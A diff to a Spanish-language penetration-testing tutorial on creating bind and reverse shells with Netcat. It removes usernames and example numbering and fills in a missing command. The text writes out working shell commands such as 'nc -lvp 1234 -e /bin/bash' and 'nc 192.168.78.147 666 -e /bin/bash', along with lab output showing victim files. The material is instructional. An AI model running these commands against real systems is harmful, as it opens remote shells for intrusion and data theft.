@@ -51,18 +51,18 @@ Un atacante podría usar el comando **`nc -lvp 1234 -e /bin/bash`** en el sistem
 #### C_reación de un shell de enlace utilizando Netcat._
 
 ```
-omar@jorel:~$ nc -lvp 1234 -e /bin/bash
+~$ nc -lvp 1234 -e /bin/bash
 listening on [any] 1234 ...
 ```
 
 > Windows **nc -lvp 1234 -e cmd.exe** Netcat.
 
-En el sistema atacante (192.168.78.147), se utiliza el comando  para conectarse con la víctima**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.
+En el sistema atacante (192.168.78.147), se utiliza el comando nc -nv 192.168.78.6 1234 para conectarse con la víctima**.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.
 
-_**Ejemplo 8-3**_ _: Conexión al Bind Shell mediante Netcat_
+#### _Conexión al Bind Shell mediante Netcat_
 
 ```
-root@kali:~# nc -nv 192.168.78.6 1234
+~# nc -nv 192.168.78.6 1234
 (UNKNOWN) [192.168.78.6] 1234 (?) open
 ls
 secret_doc_1.doc
@@ -70,24 +70,22 @@ secret_doc_2.pdf
 secret_doc_3.txt
 ```
 
-Cuando el atacante se conecta, el mensaje resaltado en el ejemplo 8-4 se muestra en el sistema de la víctima.
-
-_**Ejemplo 8-4**_ _: un atacante conectado a una víctima mediante un Bind Shell_
+#### _Un atacante conectado a una víctima mediante un Bind Shell_
 
 ```
-omar@jorel:~$ nc -lvp 1234 -e /bin/bash
+~$ nc -lvp 1234 -e /bin/bash
 listening on [any] 1234 ...
 connect to [192.168.78.6] from (UNKNOWN) [192.168.78.147] 52100 
 ```
 
 Uno de los desafíos de usar shells de enlace es que si el sistema de la víctima está detrás de un firewall, el puerto de escucha podría estar bloqueado. Sin embargo, si el sistema de la víctima puede iniciar una conexión con el sistema atacante en un puerto determinado, se puede utilizar un shell inverso para superar este desafío.
 
-El ejemplo 8-5 muestra cómo crear un shell inverso usando Netcat. En este caso, para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema atacante para escuchar un puerto específico (puerto 666 en este ejemplo).
+Para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema atacante para escuchar un puerto específico.
 
-_**Ejemplo 8-5**_ _: creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_
+#### _Creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_
 
 ```
-root@kali:~# nc -lvp 666
+~# nc -lvp 666
 listening on [any] 666 ...
 192.168.78.6: inverse host lookup failed: Unknown host
 connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
@@ -98,20 +96,20 @@ secret_doc_3.txt
 
 ```
 
-Luego, en el host comprometido (la víctima), puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante, como se demuestra en el Ejemplo 8-6.
+Luego, en el host comprometido, puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante.
 
-_**Ejemplo 8-6**_ _: Conexión al sistema atacante (Shell inverso) mediante Netcat_
-
-```
-omar@jorel:~$ nc 192.168.78.147 666 -e /bin/bash
-```
-
-Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos, como se muestra en las líneas resaltadas en el Ejemplo 8-7.
-
-_**Ejemplo 8-7**_ _: Ejecutar comandos en el sistema de la víctima a través de un Shell inverso_
+_Conexión al sistema atacante (Shell inverso) mediante Netcat_
 
 ```
-root@kali:~# nc -lvp 666
+~$ nc 192.168.78.147 666 -e /bin/bash
+```
+
+Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos.
+
+#### _Ejecutar comandos en el sistema de la víctima a través de un Shell inverso_
+
+```
+~# nc -lvp 666
 listening on [any] 666 ...
 192.168.78.6: inverse host lookup failed: Unknown host
 connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
